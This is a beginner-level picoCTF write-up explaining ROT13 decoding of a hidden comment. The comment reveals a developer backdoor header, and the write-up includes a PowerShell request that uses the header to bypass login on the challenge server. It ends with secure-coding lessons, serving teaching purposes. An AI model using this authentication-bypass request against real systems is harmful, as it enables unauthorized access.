🔑 Step 2: Decode the Secret Message
This is ROT13 — a super simple cipher. Every letter moves 13 spots forward in the alphabet.

Think of it like a wheel:

A → N
B → O
C → P
D → Q
...
N → A
O → B
P → C

So just swap each letter 13 places. That's it!

Decoded message:

📝 NOTE: Jack — temporary bypass: use header X-Dev-Access: yes

🚪 Step 3: What Does This Mean?
Imagine a building with:

🚪 Front door → needs a key (password)
🚪 Back door → open to anyone who says the magic word
Jack (the developer) accidentally left the back door open in the code. The magic word is a special header:

X-Dev-Access: yes

If you include this header in your request, the server says:

✅ "Oh, you're a dev? Right in! No password needed!"

💥 Step 4: Exploit It (PowerShell)
$response = Invoke-WebRequest -Uri "http://amiable-citadel.picoctf.net:61372/login" `
  -Method POST `
  -Headers @{ "X-Dev-Access" = "yes" } `
  -Body "email=ctf-player@picoctf.org&password=test" `
  -ContentType "application/x-www-form-urlencoded"

$response.Content

🎉 Done! The flag appears in the response. You didn't even need the real password!

🏆 Flag
picoCTF{...}

(Replace with your actual flag)

🧠 What Did We Learn?
✅ Good Practice	❌ What Went Wrong
Remove debug code before going live	Left a backdoor in production
Never trust user-controlled headers	Trusted X-Dev-Access blindly
Don't hide secrets in comments	Encoded a secret in plain sight

💡 Real-world lesson: Even if you "hide" a secret by encoding it, anyone who can view the source can find it. Delete debug code before deploying. Always. 🚫🔑

